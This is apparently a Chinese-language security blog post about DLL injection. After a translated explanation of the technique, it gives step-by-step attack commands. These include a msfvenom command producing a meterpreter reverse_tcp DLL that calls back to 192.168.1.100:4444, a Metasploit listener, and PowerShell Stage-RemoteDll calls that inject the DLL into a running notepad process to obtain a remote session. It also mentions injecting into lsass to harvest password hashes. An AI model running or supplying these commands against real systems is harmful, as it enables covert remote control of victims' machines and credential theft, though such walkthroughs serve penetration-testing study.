---
title: Stage-RemoteDll | powershell -DLL-MSF
date: 2017-12-30 21:00:46
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/Stage-RemoteDll.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

```markdown
Github  https://github.com/FuzzySecurity/PowerShell-Suite/edit/master/Stage-RemoteDll.ps1
```
## 介绍
DLL注入基本上是将代码插入/注入正在运行的进程的过程。我们注入的代码是以动态链接库（DLL）的形式。为什么？运行时需要根据需要加载DLL（如UNIX中的共享库）。在这个项目中，我将只使用DLL，但是我们实际上可以用许多其他的形式（任何PE文件，shellcode /程序集等）来注入代码，正如在恶意软件中常见的那样。

另外，请记住，您需要具有适当级别的权限才能开始播放其他进程的内存。但是，我不会谈论受保护的进程和Windows 特权级别（在Vista中引入）。这是一个完全不同的主题。

同样，正如我上面所说，DLL注入可以用于合法的目的。例如，防病毒和端点安全解决方案使用这些技术将自己的软件代码/钩子放入系统上的所有正在运行的进程中。这使得他们能够在运行过程中监控每个流程，更好地保护我们。也有恶意的目的。通常使用的常用技术是注入“lsass”进程以获取密码哈希值。我们都做到了。期。显然，恶意软件也广泛使用代码注入技术。要么运行shellcode，运行PE文件，要么将DLL加载到另一个进程的内存中以隐藏自身等等。

## 基础
我们将为每种技术使用MS Windows API，因为它提供了相当多的功能，允许我们附加和操作其他进程。从操作系统的第一个版本开始，DLL一直是MS Windows的基石。实际上，MS Windows API中的所有功能都包含DLL。一些最重要的是“Kernel32.dll”（包含用于管理内存，进程和线程的函数），“User32.dll”（主要是用户界面函数）和“GDI32.dll”文本显示）。

您可能想知道为什么这样的API存在，为什么微软会给我们这样一个很好的功能来播放和混淆其他进程的内存呢？主要原因是扩展应用程序的功能。例如，一个公司创建一个应用程序，并希望允许其他公司扩展或增强应用程序。所以是的，它有一个合法的使用目的。此外，DLL对于项目管理，保存内存，资源共享等都非常有用。

下图试图说明几乎每个DLL注入技术的流程。

![enter description here][2]

  
原文链接：http://blog.deniable.org/blog/2017/07/16/inject-all-the-things/

废话不多说 推主发了这个图 ，正好我想复现这个
![enter description here][3]
&nbsp;
## MSF
使用MSF 生成dll 
```markdown
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll >demon.dll 
```
&nbsp;
启动MSF 监听
![enter description here][4]
msfconsole -r handler.rc 

&nbsp;
![enter description here][5]
&nbsp;
## Powershell
执行PAYLOAD
```markdown
Get-Process notepad  (获取某个进程 )
Import-Module .\Stage-RemoteDll.ps1   (导入远程dll 模块 )
Stage-RemoteDll -ProcID 8208 -DllPath .\demon.dll -Mode QueueUserAPC  -Verbose  (进行dll 注入)
```
![enter description here][6]
最终得到会话
![enter description here][7]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/7AFAE845AAE84FF4B3F4659498B3C037.png
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/diagram.png
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/DMmR5z_W4AAN0_E.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1514640392133.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1514640345929.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1514641182460.jpg 
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1514640573025.jpg